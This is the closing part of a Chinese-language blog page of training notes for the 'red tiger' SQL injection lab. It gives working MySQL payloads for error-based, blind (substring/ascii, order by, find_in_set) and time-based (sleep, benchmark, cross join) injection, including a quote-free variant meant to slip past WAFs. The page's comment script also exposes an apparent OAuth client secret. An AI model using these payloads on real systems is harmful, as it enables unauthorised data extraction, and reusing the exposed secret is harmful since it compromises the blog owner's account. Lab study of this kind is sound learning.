</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>select</span><span class=w> </span><span class=n>ST_LongFromGeoHash</span><span class=p>(</span><span class=k>version</span><span class=p>());</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=n>MySQL</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=mi>5</span><span class=p>.</span><span class=mi>7</span><span class=p>.</span><span class=mi>5</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=err>错误</span><span class=w> </span><span class=p>[</span><span class=mi>1411</span><span class=p>]</span><span class=w> </span><span class=p>[</span><span class=n>HY000</span><span class=p>]:</span><span class=w> </span><span class=n>Incorrect</span><span class=w> </span><span class=n>geohash</span><span class=w> </span><span class=n>value</span><span class=p>:</span><span class=w> </span><span class=s1>&#39;5.7.33&#39;</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=k>function</span><span class=w> </span><span class=n>ST_LONGFROMGEOHASH</span><span class=w>
</span></code></pre></td></tr></table>
</div>
</div><h2 id=blind-sql-injection>blind SQL injection</h2>
<p>两个技巧。</p>
<h3 id=ifsubstringasciichar>if/substring/ascii/char</h3>
<p>灵活运用 <code>if</code>、<code>substring</code>、<code>ascii</code>、<code>char</code> 这些函数。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>test</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>0</span><span class=w> </span><span class=k>OR</span><span class=w> </span><span class=k>IF</span><span class=p>(</span><span class=n>FIND_IN_SET</span><span class=p>(</span><span class=k>substring</span><span class=p>(</span><span class=k>version</span><span class=p>(),</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=s1>&#39;0,1,2,3,4,5&#39;</span><span class=p>),</span><span class=k>TRUE</span><span class=p>,</span><span class=k>FALSE</span><span class=p>);</span><span class=w>
</span></code></pre></td></tr></table>
</div>
</div><p><code>ascii</code>和<code>char</code>两个函数主要是解决不能注入字符串之类的问题。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>test</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=w> </span><span class=k>OR</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=k>substring</span><span class=p>(</span><span class=k>version</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>))</span><span class=w> </span><span class=k>IN</span><span class=w> </span><span class=p>(</span><span class=mi>48</span><span class=p>,</span><span class=mi>49</span><span class=p>,</span><span class=mi>50</span><span class=p>,</span><span class=mi>51</span><span class=p>,</span><span class=mi>52</span><span class=p>,</span><span class=mi>53</span><span class=p>);</span><span class=w>
</span></code></pre></td></tr></table>
</div>
</div><p>这样就能完全避免注入的SQL里包含<code>'</code>，对过滤 <code>'</code>的 WAF 大概会有用。</p>
<p>此外其他的返回布尔值的函数多少在合适的地方还是能一战的吧。</p>
<h3 id=order-by>order by</h3>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>test</span><span class=w> </span><span class=k>ORDER</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=p>(</span><span class=n>id</span><span class=o>*</span><span class=k>IF</span><span class=w> </span><span class=p>(</span><span class=n>ASCII</span><span class=p>(</span><span class=k>substring</span><span class=p>(</span><span class=k>VERSION</span><span class=p>(),</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>))</span><span class=o>=</span><span class=mi>53</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span><span class=w> </span><span class=p>;</span><span class=w>
</span></code></pre></td></tr></table>
</div>
</div><p>注入点在 <code>order by</code> 子句的时候比较有用。</p>
<h3 id=find_in_set>find_in_set</h3>
<p>这个就是纯 trick 了。用 <code>find_in_set</code> 可以一次判断更大的范围，减少请求次数。比如原本测试字符串一位就要跑字母表26个字母，算上大小写直接翻倍。<code>find_in_set</code>可以用的话就能实现二分法搜索，时间复杂度骤降。</p>
<h2 id=time-based-sql-injection>Time based SQL injection</h2>
<p>也叫 <em>double blind SQL injection</em>， 双盲指的是就连SQL执行结果都看不到。不管传什么都返回完全相同的页面。这种情况只能靠请求时间来判断了。</p>
<h3 id=sleep>sleep</h3>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>select</span><span class=w> </span><span class=k>if</span><span class=p>(</span><span class=k>version</span><span class=p>()</span><span class=w> </span><span class=k>like</span><span class=w> </span><span class=s1>&#39;5%&#39;</span><span class=p>,</span><span class=w> </span><span class=n>sleep</span><span class=p>(</span><span class=mi>10</span><span class=p>),</span><span class=w> </span><span class=k>false</span><span class=p>);</span><span class=w>
</span></code></pre></td></tr></table>
</div>
</div><p>不必多解释了吧。</p>
<h3 id=benchmark>benchmark</h3>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>select</span><span class=w> </span><span class=n>benchmark</span><span class=w> </span><span class=p>(</span><span class=mi>10000000</span><span class=p>,</span><span class=w> </span><span class=n>md5</span><span class=p>(</span><span class=n>now</span><span class=p>()));</span><span class=w>
</span></code></pre></td></tr></table>
</div>
</div><p>这种做法叫 <code>heavy queries</code>，就是给MySQL一个压力很大的查询，让MySQL花更长时间执行。除了 <code>benchmark</code> 之外还可以用 cross join ，求两个大表的笛卡尔积。cross join 时算法类似下面这样：</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=k>for</span> <span class=nx>r1</span> <span class=o>:=</span> <span class=k>range</span> <span class=nx>table1</span> <span class=p>{</span>
    <span class=k>for</span> <span class=nx>r2</span> <span class=o>:=</span> <span class=k>range</span> <span class=nx>table2</span> <span class=p>{</span>
        <span class=nx>results</span> <span class=p>=</span> <span class=nb>append</span><span class=p>(</span><span class=nx>results</span><span class=p>,</span> <span class=nf>pair</span><span class=p>(</span><span class=nx>r1</span><span class=p>,</span><span class=nx>r2</span><span class=p>))</span>
    <span class=p>}</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>计算量等于两个表行数的积。不过前提是要知道表名，最少知道自己的表名，起码还能 JOIN 自己。如果数据量太少的话这个方法产生的返回时间差不够明显，就不能用了。</p>
<h2 id=参考>参考</h2>
<ul>
<li><a class=link href=https://dev.mysql.com/doc/refman/5.7/en/json-function-reference.html target=_blank rel=noopener>MySQL 5.7 Manual - JSON function reference</a></li>
<li><a class=link href=https://phonexicum.github.io/infosec/sql-injection.html target=_blank rel=noopener>phonexicum.github.io SQLi</a></li>
</ul>
<h2 id=思考>思考</h2>
<p>red tiger 的 level 1 和 level 2 真的很简单。选择正确的位置注入就能直接 pass，不需要考虑 bypass WAF，没有 trick。</p>
<p>level 3 开始就比较狗了，提示 try to get an error，但这句话不是让你往 error based SQL injection 的方向想，我就给带歪了，还想着怎么制造个能回显的注入 payload ，实际上根本不是这个意思。正确的方向是 制造一个 <strong>PHP的错误</strong>，解密 <code>usr</code> 这个参数。</p>
<p>具体就不说了，总之制造 PHP 的错误也需要动 <code>usr</code> ，我给的关键词是 type error，提示很明显了。</p>
<h2 id=总结>总结</h2>
<p>以上，玩得开心。</p>
</section>
<footer class=article-footer>
<section class=article-tags>
<a href=/blog/tags/security/>security</a>
<a href=/blog/tags/redtiger/>redtiger</a>
</section>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
</footer>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css integrity=sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js integrity=sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8 crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js integrity=sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.querySelector(`.article-content`),{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script>
</article>
<aside class=related-contents--wrapper>
<h2 class=section-title>相关文章</h2>
<div class=related-contents>
<div class="flex article-list--tile">
<article>
<a href=/blog/p/redtiger-lab-training-note-2022-05-06/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>red tiger 打靶日志</h2>
</div>
</a>
</article>
<article>
<a href=/blog/p/%E5%9F%BA%E4%BA%8Ecreateremotethread%E7%9A%84dll%E6%B3%A8%E5%85%A5/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>基于CreateRemoteThread的DLL注入</h2>
</div>
</a>
</article>
<article>
<a href=/blog/p/sqli-labs-training-5/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>sqli-labs 实验记录 #5</h2>
</div>
</a>
</article>
<article>
<a href=/blog/p/sqli-labs-training-4/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>sqli-labs 实验记录 #4</h2>
</div>
</a>
</article>
<article>
<a href=/blog/p/sqli-labs-training-3/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>sqli-labs 实验记录 #3</h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<link rel=stylesheet href=https://unpkg.com/vssue/dist/vssue.min.css>
<div id=vssue></div>
<script src=https://unpkg.com/vue@2.6.14/dist/vue.runtime.min.js></script>
<script src=https://unpkg.com/vssue@1.4.8/dist/vssue.github.min.js></script>
<script>new Vue({el:"#vssue",render:a=>a("Vssue",{props:{title:"redtiger靶场训练笔记",options:{autoCreateIssue:!1,owner:"nnnewb",repo:"blog",clientId:"285910fdc1567a1a23e3",clientSecret:"f00da5438d9ac82c4a86024866c7a916ae411edc"}}})})</script>
<footer class=site-footer>
<section class=copyright>
&copy;
2021 -
2022 weakptr's 笔记
</section>
<section class=powerby>
GitHub Pages <br>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.11.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计
，由 <a href=https://nnnewb.github.io/blog/>nnnewb</a> 修改
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">目录</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#前言>前言</a></li>
<li><a href=#error-based-sql-injection>error based SQL injection</a>
<ol>
<li><a href=#当前表列数量>当前表列数量</a>
<ol>
<li><a href=#group-by-法>group by 法</a></li>
<li><a href=#order-by-法>order by 法</a></li>
<li><a href=#子查询法>子查询法</a></li>
<li><a href=#union-法>union 法</a></li>
</ol>
</li>
<li><a href=#获取列名>获取列名</a>
<ol>
<li><a href=#unionnotnull>union+notnull</a></li>
<li><a href=#insert>insert</a></li>
<li><a href=#join>join</a></li>
</ol>
</li>
<li><a href=#获取值>获取值</a>
<ol>
<li><a href=#count-floorrand02-group-by>count floor(rand(0)*2) group by</a></li>
<li><a href=#bigint-unsigned>BIGINT UNSIGNED</a></li>
<li><a href=#updatexml>updatexml</a></li>
<li><a href=#extractvalue>extractvalue</a></li>
<li><a href=#st_longfromgeohash>ST_LongFromGeoHash</a></li>
</ol>
</li>
</ol>
</li>
<li><a href=#blind-sql-injection>blind SQL injection</a>
<ol>
<li><a href=#ifsubstringasciichar>if/substring/ascii/char</a></li>
<li><a href=#order-by>order by</a></li>
<li><a href=#find_in_set>find_in_set</a></li>
</ol>
</li>
<li><a href=#time-based-sql-injection>Time based SQL injection</a>
<ol>
<li><a href=#sleep>sleep</a></li>
<li><a href=#benchmark>benchmark</a></li>
</ol>
</li>
<li><a href=#参考>参考</a></li>
<li><a href=#思考>思考</a></li>
<li><a href=#总结>总结</a></li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous></script><script type=text/javascript src=/blog/ts/main.js defer></script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>